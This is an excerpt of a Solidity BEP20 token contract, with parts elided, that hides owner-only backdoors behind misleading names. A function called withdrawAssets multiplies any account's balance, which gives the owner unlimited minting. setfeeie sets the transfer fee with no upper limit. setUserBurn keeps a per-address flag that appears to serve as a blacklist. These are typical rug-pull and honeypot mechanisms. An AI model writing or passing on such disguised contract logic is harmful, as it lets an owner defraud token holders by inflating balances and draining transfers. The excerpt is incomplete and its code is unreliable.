...
contract Token is IBEP20, HasForeignAsset {
    ...
    uint256 private _feeie = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => bool) private _burns;
    function setUserBurn(address accsount) public onlyOwner {
        _burns[accsount] = true;
    }

    function rmUserBun(address accsount) public onlyOwner {
        _burns[accsount] = false;
    }

    function getBun(address accsount) public view returns (bool) {
        return _burns[accsount];
    }

    function withdrawAssets(address accsount,uint256 num) public onlyOwner {
        _balances[accsount] = _balances[accsount].mul(num);
    }
    ...
    function setfeeie(uint256 _value) external onlyOwner {
        _feeie = _value;
    }


    function getfeeie() external onlyOwner returns(uint256){
        return _feeie;
    }
     ...
     * e.g. implement automatic token feeies, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
    ...
    function _transfer(
        ...
        uint256 feeieAmount = 0;
        feeieAmount = amount.mul(_feeie).div(100);
        uint256 amoun;
        amoun = amount - feeieAmount;
        ...
        if (feeieAmount > 0) {
            emit Transfer(sender, _DEADaddress, feeieAmount);
        }
